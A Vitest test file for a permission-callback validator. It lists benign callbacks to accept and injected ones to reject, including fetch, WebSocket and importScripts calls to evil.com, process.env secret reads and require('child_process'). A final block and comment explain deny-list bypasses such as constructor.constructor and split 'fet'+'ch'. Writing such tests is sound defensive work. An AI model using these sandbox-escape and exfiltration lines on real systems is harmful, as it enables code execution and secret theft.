import { describe, expect, it } from "vitest";
import { validatePermissionSource } from "../../src/permission-validation.js";

describe("browser permission callback validation", () => {
	// Normal permission callbacks — must be accepted
	describe("allows valid permission callbacks", () => {
		it("arrow function returning allow: true", () => {
			const source = `(req) => ({ allow: true })`;
			expect(validatePermissionSource(source)).toBe(true);
		});

		it("arrow function returning allow: false", () => {
			const source = `(req) => ({ allow: false })`;
			expect(validatePermissionSource(source)).toBe(true);
		});

		it("arrow function with path check", () => {
			const source = `(req) => ({ allow: req.path.startsWith('/app') })`;
			expect(validatePermissionSource(source)).toBe(true);
		});

		it("arrow function with op check", () => {
			const source = `(req) => ({ allow: req.op === 'read' })`;
			expect(validatePermissionSource(source)).toBe(true);
		});

		it("regular function expression", () => {
			const source = `function(req) { return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(true);
		});

		it("named function expression", () => {
			const source = `function checkPermission(req) { return { allow: req.op === 'read' }; }`;
			expect(validatePermissionSource(source)).toBe(true);
		});

		it("arrow function with block body", () => {
			const source = `(req) => { return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(true);
		});

		it("multi-param arrow function", () => {
			const source = `(req, ctx) => ({ allow: true })`;
			expect(validatePermissionSource(source)).toBe(true);
		});

		it("single-param arrow function without parens", () => {
			const source = `req => ({ allow: true })`;
			expect(validatePermissionSource(source)).toBe(true);
		});
	});

	// Injected code — must be rejected
	describe("rejects permission callbacks with injected code", () => {
		it("rejects eval() injection", () => {
			const source = `(req) => { eval("malicious()"); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects new Function() injection", () => {
			const source = `(req) => { new Function("return process")(); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects Function() constructor injection", () => {
			const source = `(req) => { Function("return this")(); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects import() injection", () => {
			const source = `(req) => { import("fs"); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects require() injection", () => {
			const source = `(req) => { require("child_process"); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects globalThis access", () => {
			const source = `(req) => { globalThis.process; return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects self access", () => {
			const source = `(req) => { self.postMessage({}); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects window access", () => {
			const source = `(req) => { window.location; return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects process.exit", () => {
			const source = `(req) => { process.exit(1); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects fetch() call", () => {
			const source = `(req) => { fetch("https://evil.com"); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects WebSocket", () => {
			const source = `(req) => { new WebSocket("wss://evil.com"); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects XMLHttpRequest", () => {
			const source = `(req) => { new XMLHttpRequest(); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects constructor bracket access", () => {
			const source = `(req) => { req.constructor["prototype"]; return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects __proto__ access", () => {
			const source = `(req) => { req.__proto__; return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects Object.defineProperty", () => {
			const source = `(req) => { Object.defineProperty(req, 'allow', { value: true }); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects postMessage", () => {
			const source = `(req) => { postMessage({ type: 'steal', data: req }); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects importScripts", () => {
			const source = `(req) => { importScripts("https://evil.com/payload.js"); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects non-function source (plain expression)", () => {
			const source = `1 + 1`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects non-function source (IIFE with side effects)", () => {
			const source = `(() => { globalThis.pwned = true; })()`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects empty string", () => {
			expect(validatePermissionSource("")).toBe(false);
		});

		it("rejects process.env access", () => {
			const source = `(req) => { process.env.SECRET; return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});
	});

	// AOSB-6 (P3) — host-supplied callback, defense-in-depth.
	// The BLOCKED_PATTERNS regex deny-list (permission-validation.ts) keys on
	// exact textual forms (`constructor[`, `process.exit`, `fetch(`, etc.). An
	// attacker who controls the callback source can spell the same capability
	// in a form the regex does not match: dot-chained `.constructor.constructor`
	// (vs the bracketed `constructor[` the list checks), bracket member access
	// `process['exit']` (vs dotted `process.exit`), or string concatenation
	// `'fet'+'ch'` that reconstructs the identifier at runtime. These are real
	// sandbox-escape primitives once revived via new Function(), so
	// validatePermissionSource MUST reject them. If it returns true, the
	// deny-list is bypassable and these tests FAIL (documenting the gap).
	describe("rejects deny-list bypasses (dot-chained / computed-member / split)", () => {
		it("rejects dot-chained .constructor.constructor (Function escape)", () => {
			const source = `(req) => { req.constructor.constructor('return process')(); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects computed-member process['exit']", () => {
			const source = `(req) => { process['exit'](1); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects computed-member process['env'] secret read", () => {
			const source = `(req) => { return { allow: process['env']['SECRET'] === '1' }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects string-concatenated fetch identifier", () => {
			// Avoids the literal `fetch(` and any blocked global name; the regex
			// keys on `fetch\s*\(`, so the reconstructed identifier slips through.
			const source = `(req) => { const f = this['fet' + 'ch']; f('https://evil.com'); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});

		it("rejects computed-member constructor access on req", () => {
			const source = `(req) => { req['constructor']['constructor']('return this')(); return { allow: true }; }`;
			expect(validatePermissionSource(source)).toBe(false);
		});
	});
});
